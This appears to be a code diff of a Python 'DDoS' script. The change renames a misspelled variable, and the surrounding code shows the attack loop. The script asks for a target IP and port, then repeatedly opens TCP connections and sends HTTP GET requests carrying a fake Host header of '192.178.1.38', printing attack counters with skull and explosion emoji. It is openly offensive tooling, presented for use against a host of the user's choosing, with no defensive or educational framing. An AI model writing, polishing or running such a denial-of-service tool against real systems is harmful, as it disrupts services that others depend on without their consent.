@@ -17,7 +17,7 @@ def ddos():
         else:
             break;
     attack_num = 0
-    trget = str(input(Fore.RED + Style.BRIGHT + "ENTER IP OF THE HOST :  "))
+    target = str(input(Fore.RED + Style.BRIGHT + "ENTER IP OF THE HOST :  "))
     fake = '192.178.1.38'
     #port = 80( default http port is 80)
     while True:
@@ -28,7 +28,7 @@ def ddos():
             continue;
         else:
             break;
-    print(f"performing Ddos on {trget} on PORT {port} using FAKE IP {fake} ")
+    print(f"performing Ddos on {target} on PORT {port} using FAKE IP {fake} ")
     print(Fore.YELLOW + Style.BRIGHT + "[INFO!]" + Fore.WHITE + " if the above information is incorrect,you can restart the script and again enter the details correctly!!")
     print(Fore.YELLOW + Style.BRIGHT + "[INFO!]" + Fore.WHITE + " Press CTRL + C and press Enter to Exit!")
     time.sleep(4)
@@ -45,14 +45,14 @@ def ddos():
         while True:
             try:
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.connect((trget, port))
-                s.sendto(("GET /" + trget + " HTTP/1.1\r\n").encode("ascii"), (trget, port))
-                s.sendto(('Host: ' + fake + '\r\n\r\n').encode('ascii'), (trget, port))
+                s.connect((target, port))
+                s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode("ascii"), (target, port))
+                s.sendto(('Host: ' + fake + '\r\n\r\n').encode('ascii'), (target, port))
                 
                 attack_num += 1
                 time.sleep(1)
                 print(f"\r[☠️]\033[37m H0st > | \033[33m1{fake} \033[37m| running \033[32m{attack_num}")
-                print(f"\r[💥]\033[38;5;39m Get > \033[37m| \033[38;5;220m{trget} \033[37m|\033[38;5;37m Port > \033[91m{port}")
+                print(f"\r[💥]\033[38;5;39m Get > \033[37m| \033[38;5;220m{target} \033[37m|\033[38;5;37m Port > \033[91m{port}")
             except socket.error:
                 print('\033[32mConnection failid \033[31mHost may be down \033[94mPlease check host\033[0m')
                 break
